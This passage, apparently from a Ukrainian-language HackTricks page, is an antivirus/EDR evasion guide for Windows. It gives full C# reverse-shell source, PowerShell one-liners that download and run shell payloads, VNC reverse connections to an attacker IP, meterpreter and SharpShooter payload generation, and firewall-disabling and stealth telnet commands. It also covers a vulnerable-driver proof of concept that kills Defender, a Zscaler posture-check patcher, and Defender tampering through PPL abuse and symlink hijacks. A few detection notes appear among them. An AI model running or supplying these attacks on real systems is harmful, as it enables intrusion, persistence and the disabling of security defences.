- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко просто розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його для takeover та підтримки persistence:
1. Завантажте з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім клацніть по MSI-файлу для Windows, щоб завантажити MSI.
2. Запустіть інсталятор безшумно на машині жертви (потрібні права admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер попросить авторизувати; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наданий параметр з невеликими коригуваннями: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити PIN без використання GUI).

## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви працюєте, має свої сильні та слабкі сторони.

Раджу подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також ще одна відмінна доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірити, які частини Defender вважає шкідливими**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **поетапно видаляє частини бінарника**, поки не **виявить, яку саме частину Defender позначає як шкідливу**, і розділить це для вас.\
Інструмент, що робить те ж саме — [**avred**](https://github.com/dobin/avred) з відкритою веб-службою на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 всі Windows постачалися з **Telnet server**, який ви могли встановити (як адміністратор), роблячи:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** при старті системи та **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin downloads, а не setup)

**НА ХОСТІ**: Виконайте _**winvnc.exe**_ та налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарник _**winvnc.exe**_ та **новостворений** файл _**UltraVNC.ini**_ всередину **victim**

#### **Зворотне з'єднання**

**Атакуючий** повинен **запустити всередині** свого **хоста** бінарник `vncviewer.exe -listen 5900`, щоб він був **підготовлений** перехопити зворотне **VNC connection**. Потім, всередині **victim**: Запустіть демон `winvnc.exe -run` та виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти прихованість, не робіть наступного

- Не запускайте `winvnc`, якщо він уже працює, інакше ви викличете [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій же директорії, інакше це викличе відкриття [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для довідки, інакше це викличе [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** через `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершить процес.**

### Компіляція нашого власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте разом з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# використання компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для прикладу build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використовував невелику консольну утиліту відому як **Antivirus Terminator** для відключення endpoint-протекцій перед розгортанням ransomware. Інструмент приносить свій **вразливий але *підписаний* драйвер** і експлуатує його для виконання привілейованих операцій у kernel-просторі, які не можуть бути заблоковані навіть Protected-Process-Light (PPL) AV сервісами.

Основні висновки
1. **Signed driver**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — це легітимно підписаний драйвер `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його так, що `\\.\ServiceMouse` стає доступним з user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Можливість                               |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для зупинки Defender/EDR services) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить user-mode захисти; код, що виконується в kernel, може відкривати *protected* процеси, завершувати їх або змінювати kernel-об'єкти незалежно від PPL/PP, ELAM або інших механізмів жорсткого захисту.

Виявлення та пом'якшення
•  Увімкніть Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.  
•  Моніторте створення нових *kernel* сервісів та піднімайте алерти коли драйвер завантажується з world-writable директорії або не присутній у списку дозволених.  
•  Слідкуйте за дескрипторами у режимі користувача до кастомних device-об'єктів з подальшими підозрілими викликами `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** локально застосовує правила device-posture і використовує Windows RPC для передачі результатів іншим компонентам. Дві слабкі проектні опції роблять повний обхід можливим:

1. Оцінка posture відбувається **повністю на клієнті** (на сервер надсилається лише булеве значення).
2. Внутрішні RPC endpoint-и лише перевіряють, що підключуваний виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Шляхом **патчінгу чотирьох підписаних бінарників на диску** обидва механізми можна нейтралізувати:

| Бінарний файл | Змінена оригінальна логіка | Результат |
|---------------|---------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка проходить |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) процес може прив’язатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінена на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропущені |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів та перезапуску стеку сервісів:

* **Усі** перевірки стану відображаються як **зелені/відповідні**.
* Непідписані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Компрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як чисто клієнтські рішення довіри та прості перевірки підпису можна обійти кількома байт-патчами.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) запроваджує ієрархію підписувача/рівня, так що лише захищені процеси з рівнем не нижчим за інші можуть втручатися один в одного. З атакувальної точки зору, якщо ви легітимно запускаєте PPL-увімкнений бінарний файл і контролюєте його аргументи, ви можете перетворити нешкідливу функціональність (наприклад, логування) на обмежений, підкріплений PPL примітив запису проти захищених директорій, що використовуються AV/EDR.

Що потрібно, щоб процес запускався як PPL
- Цільовий EXE (та будь-які завантажені DLL) має бути підписаний з EKU, сумісним з PPL.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запрошено сумісний рівень захисту, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Невірні рівні призведуть до помилки під час створення.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN примітив: ClipUp.exe
- Підписаний системний бінарник `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог‑файлу у шлях, вказаний викликачем.
- Коли запускається як PPL-процес, запис файлу виконується з підтримкою PPL.
- ClipUp не може розбирати шляхи, що містять пробіли; використовуйте 8.3 короткі імена, щоб вказати на зазвичай захищені локації.

8.3 short path helpers
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-сумісний LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху лог-файлу ClipUp, щоб примусити створення файлу у захищеному каталозі AV (e.g., Defender Platform). При необхідності використовуйте 8.3 короткі імена.
3) Якщо цільовий бінарник зазвичай відкритий/заблокований AV під час роботи (e.g., MsMpEng.exe), заплануйте запис під час завантаження до того, як AV запуститься, встановивши автозапускову службу, що надійно запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис під захистом PPL відбувається до того, як AV заблокує свої бінарники, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім його розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Потребує локальних прав Local Administrator/SYSTEM для встановлення/запуску служби та вікна для перезавантаження.
- Часування критичне: ціль не повинна бути відкрита; виконання під час завантаження дозволяє уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьком є нестандартний лаунчер, під час завантаження.
- Нові служби, налаштовані на автозапуск підозрілих бінарників і які стабільно запускаються до Defender/AV. Розслідуйте створення/зміну служб перед помилками запуску Defender.
- Моніторинг цілісності файлів для бінарників Defender/каталогів Platform; несподівані створення/зміни файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL непро-AV бінарниками.

Міри захисту
- WDAC/Code Integrity: обмежте, які підписані бінарники можуть виконуватись як PPL і під якими батьками; блокуйте виклики ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну автозапуску служб і відстежуйте маніпуляції порядком запуску.
- Переконайтесь, що захист від маніпуляцій Defender та ранні механізми захисту запуску увімкнені; розслідуйте помилки запуску, що вказують на пошкодження бінарників.
- Розгляньте вимкнення генерації коротких імен 8.3 на томах, що містять інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно тестуйте).

Посилання щодо PPL та інструментів
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Передумови
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Чому це працює
- Defender блокує записи у власних папках, але вибір платформи довіряє записам директорій і обирає лексикографічно найвищу версію без перевірки, що ціль посилання веде до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте записувану копію поточної папки платформи, напр. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink директорії вищої версії всередині Platform, який вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger selection (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні побачити новий шлях процесу під `C:\TMP\AV\` та конфігурацію сервісу/реєстру, що відображає це розташування.

Post-exploitation options
- DLL sideloading/code execution: Помістіть або замініть DLL, які Defender завантажує з його каталогу програми, щоб виконати код у процесах Defender. Див. секцію вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink так, щоб при наступному запуску налаштований шлях не знаходився і Defender не зможе запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу: This technique does not provide privilege escalation by itself; it requires admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перемістити runtime evasion з C2 implant у сам цільовий модуль, хукуючи його Import Address Table (IAT) і перенаправляючи вибрані API через attacker-controlled, position‑independent code (PIC). Це узагальнює evasion поза тими невеликими API surface, які багато kit-ів експонують (наприклад, CreateProcessA), і поширює ті самі захисні заходи на BOFs і post‑exploitation DLLs.

Загальний підхід
- Розмістити PIC blob поряд із цільовим модулем за допомогою reflective loader (prepended або companion). PIC має бути self‑contained і position‑independent.
- Під час завантаження host DLL пройти його IMAGE_IMPORT_DESCRIPTOR і запатчити IAT entries для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasions перед тим, як зробити tail‑call до реальної адреси API. Типові evasions включають:
  - Memory mask/unmask навколо виклику (наприклад, encrypt beacon regions, RWX→RX, змінити page names/permissions), потім відновити після виклику.
  - Call‑stack spoofing: сконструювати benign stack і перейти до цільового API так, щоб call‑stack analysis резолював очікувані кадри.
- Для сумісності експортувати інтерфейс, щоб Aggressor script (або еквівалент) міг зареєструвати, які APIs хукати для Beacon, BOFs і post‑ex DLLs.

Чому IAT hooking тут
- Працює для будь‑якого коду, що використовує захоплений import, без модифікації коду інструменту або залежності від Beacon як proxy для конкретних API.
- Охоплює post‑ex DLLs: хукуючи LoadLibrary* можна перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ті самі masking/stack evasions до їхніх API викликів.
- Відновлює надійне виконання команд post‑ex, що створюють процеси, проти виявлень, що базуються на call‑stack, обгортаючи CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Зберігайте обгортки компактними та PIC‑безпечними; отримуйте справжнє API через оригінальне значення IAT, яке ви зняли до патчу, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і уникайте залишати сторінки, що одночасно мають writable і executable права.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- Це обходить детекції, які очікують канонічні стеки від Beacon/BOFs до чутливих API.
- Поєднуйте з техніками stack cutting/stack stitching, щоб опинитися всередині очікуваних фреймів перед прологом API.

Операційна інтеграція
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Використовуйте скрипт Aggressor для реєстрації цільових API, щоб Beacon і BOFs прозоро користувались тим самим шляхом обходу без змін коду.

Виявлення/DFIR — міркування
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Пов’язані складові та приклади
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
